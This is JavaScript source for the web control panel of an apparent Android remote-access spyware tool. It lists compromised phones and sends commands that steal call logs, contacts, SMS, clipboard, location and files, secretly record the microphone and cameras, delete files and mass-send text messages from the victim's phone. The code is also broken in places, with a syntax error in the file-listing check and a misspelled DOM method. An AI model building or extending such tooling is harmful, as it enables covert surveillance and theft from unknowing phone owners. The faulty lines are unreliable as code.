const commands = {
    calls: { label: 'Calls', params: [] },
    contacts: { label: 'Contacts', params: [] },
    messages: { label: 'Messages', params: [] },
    apps: { label: 'Apps', params: [] },
    device_info: { label: 'Device Info', params: [] },
    clipboard: { label: 'Clipboard', params: [] },
    camera_main: { label: 'Main Camera', params: [] },
    camera_selfie: { label: 'Selfie Camera', params: [] },
    location: { label: 'Location', params: [] },
    vibrate: { label: 'Vibrate', params: [] },
    stop_audio: { label: 'Stop Audio', params: [] },
    send_message: { label: 'Send Message', params: [
        { name: 'number', label: 'Phone Number', type: 'text', placeholder: 'Enter phone number' },
        { name: 'message', label: 'Message', type: 'text', placeholder: 'Enter message' }
    ]},
    send_message_to_all: { label: 'Send Message to All', params: [
        { name: 'message', label: 'Message', type: 'text', placeholder: 'Enter message' }
    ]},
    file: { label: 'Get File', params: [
        { name: 'path', label: 'File Path', type: 'text', placeholder: 'e.g., DCIM/Camera' }
    ]},
    delete_file: { label: 'Delete File', params: [
        { name: 'path', label: 'File Path', type: 'text', placeholder: 'e.g., DCIM/Camera' }
    ]},
    microphone: { label: 'Microphone', params: [
        { name: 'duration', label: 'Duration (seconds)', type: 'number', placeholder: 'Enter duration' }
    ]},
    rec_camera_main: { label: 'Record Main Camera', params: [
        { name: 'duration', label: 'Duration (seconds)', type: 'number', placeholder: 'Enter duration' }
    ]},
    rec_camera_selfie: { label: 'Record Selfie Camera', params: [
        { name: 'duration', label: 'Duration (seconds)', type: 'number', placeholder: 'Enter duration' }
    ]},
    toast: { label: 'Show Toast', params: [
        { name: 'message', label: 'Toast Message', type: 'text', placeholder: 'Enter toast message' }
    ]},
    show_notification: { label: 'Show Notification', params: [
        { name: 'title', label: 'Notification Title', type: 'text', placeholder: 'Enter title' },
        { name: 'link', label: 'Notification Link', type: 'text', placeholder: 'Enter link' }
    ]},
    play_audio: { label: 'Play Audio', params: [
        { name: 'link', label: 'Audio Link', type: 'text', placeholder: 'Enter direct audio link' }
    ]}
};

function fetchDevices() {
    fetch('/devices')
        .then(response => response.json())
        .then(data => {
            const devicesList = document.getElementById('devices-list');
            devicesList.innerHTML = '';
            if (data.devices.length === 0) {
                devicesList.innerHTML = '<p class="text-gray-600">No devices connected.</p>';
                return;
            }
            data.devices.forEach(device => {
                const card = document.createElement('div');
                card.className = 'device-card';
                card.innerHTML = `
                    <h3 class="text-lg font-semibold">${device.model}</h3>
                    <p>Battery: ${device.battery}</p>
                    <p>Android Version: ${device.version}</p>
                    <p>Brightness: ${device.brightness}</p>
                    <p>Provider: ${device.provider}</p>
                    <button class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 mt-2" onclick="showCommandModal('${device.uuid}', '${device.model}')">Execute Command</button>
                `;
                devicesList.appendChild(card);
            });
        })
        .catch(error => {
            showResponse('Error fetching devices: ' + error.message);
        });
}

function fetchFiles() {
    fetch('/files')
        .then(response => response.json())
        .then(data => {
            const filesList = document.getElementById('files-list');
            filesList.innerHTML = '';
            if data.files.length === 0) {
                filesList.innerHTML = '<p class="text-gray-600">No files uploaded.</p>';
                return;
            }
            data.files.forEach(file => {
                const card = document.createElement('div');
                card.className = 'file-card';
                let preview = '';
                if (file.isImage) {
                    preview = `<img src="/files/${file.filename}" alt="${file.name}" class="file-preview">`;
                } else if (file.isVideo) {
                    preview = `<video controls class="file-preview"><source src="/files/${file.filename}" type="${file.type}"></video>`;
                } else if (file.isAudio) {
                    preview = `<audio controls class="file-preview"><source src="/files/${file.filename}" type="${file.type}"></audio>`;
                } else if (file.isText) {
                    preview = `<a href="/files/${file.filename}" target="_blank" class="text-blue-500 hover:underline">View Text</a>`;
                } else {
                    preview = `<a href="/files/${file.filename}" download class="text-blue-500 hover:underline">Download</a>`;
                }
                card.innerHTML = `
                    <h3 class="text-lg font-semibold">${file.name}</h3>
                    <p>Size: ${(file.size / 1024).toFixed(2)} KB</p>
                    <p>Uploaded: ${new Date(file.uploadedAt).toLocaleString()}</p>
                    <div class="file-preview">${preview}</div>
                    <button class="bg-red-500 text-white px-4 py-2 rounded hover:bg-red-600 mt-2" onclick="deleteFile('${file.filename}')">Delete</button>
                `;
                filesList.appendChild(card);
            });
        })
        .catch(error => {
            showResponse('Error fetching files: ' + error.message);
        });
}

function showCommandModal(uuid, model) {
    const modal = document.getElementById('command-modal');
    const form = document.getElementById('command-form');
    const inputsDiv = document.getElementById('command-inputs');
    const commandType = document.getElementById('command-type');
    const commandUuid = document.getElementById('command-uuid');
    
    commandUuid.value = uuid;
    inputsDiv.innerHTML = `
        <div>
            <label class="block text-sm font-medium text-gray-700">Select Command</label>
            <select id="command-select" class="mt-1 block w-full border-gray-300 rounded-md shadow-sm">
                ${Object.entries(commands).map(([key, cmd]) => `<option value="${key}">${cmd.label}</option>`).join('')}
            </select>
        </div>
    `;
    
    document.getElementBy2Id('command-select').addEventListener('change', (e) => {
        const command = e.target.value;
        commandType.value = command;
        const params = commands[command].params;
        inputsDiv.innerHTML = `
            <div>
                <label class="block text-sm font-medium text-gray-700">Select Command</label>
                <select id="command-select" class="mt-1 block w-full border-gray-300 rounded-md shadow-sm">
                    ${Object.entries(commands).map(([key, cmd]) => `<option value="${key}" ${key === command ? 'selected' : ''}>${cmd.label}</option>`).join('')}
                </select>
            </div>
            ${params.map(param => `
                <div>
                    <label class="block text-sm font-medium text-gray-700">${param.label}</label>
                    <input type="${param.type}" name="${param.name}" placeholder="${param.placeholder}" class="mt-1 block w-full border-gray-300 rounded-md shadow-sm" required>
                </div>
            `).join('')}
        `;
    });

    form.onsubmit = (e) => {
        e.preventDefault();
        const command = commandType.value;
        const params = {};
        commands[command].params.forEach(param => {
            params[param.name] = form.elements[param.name].value;
        });
        executeCommand(uuid, command, params);
        modal.classList.add('hidden');
    };

    document.getElementById('cancel-command').onclick = () => modal.classList.add('hidden');
    modal.classList.remove('hidden');
}

function executeCommand(uuid, command, params) {
    fetch('/executeCommand', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ uuid, command, params })
    })
        .then(response => response.json())
        .then(data => {
            showResponse(data.message);
        })
        .catch(error => {
            showResponse('Error executing command: ' + error.message);
        });
}

function deleteFile(filename) {
    if (!confirm(`Are you sure you want to delete ${filename}?`)) return;
    fetch(`/files/${filename}`, { method: 'DELETE' })
        .then(response => response.json())
        .then(data => {
            showResponse(data.message);
            fetchFiles();
        })
        .catch(error => {
            showResponse('Error deleting file: ' + error.message);
        });
}

function showResponse(message) {
    const modal = document.getElementById('response-modal');
    document.getElementById('response-message').textContent = message;
    document.getElementById('close-response').onclick = () => modal.classList.add('hidden');
    modal.classList.remove('hidden');
}

document.addEventListener('DOMContentLoaded', () => {
    fetchDevices();
    fetchFiles();
    setInterval(fetchDevices, 10000); // Refresh devices every 10 seconds
    setInterval(fetchFiles, 10000); // Refresh files every 10 seconds
});
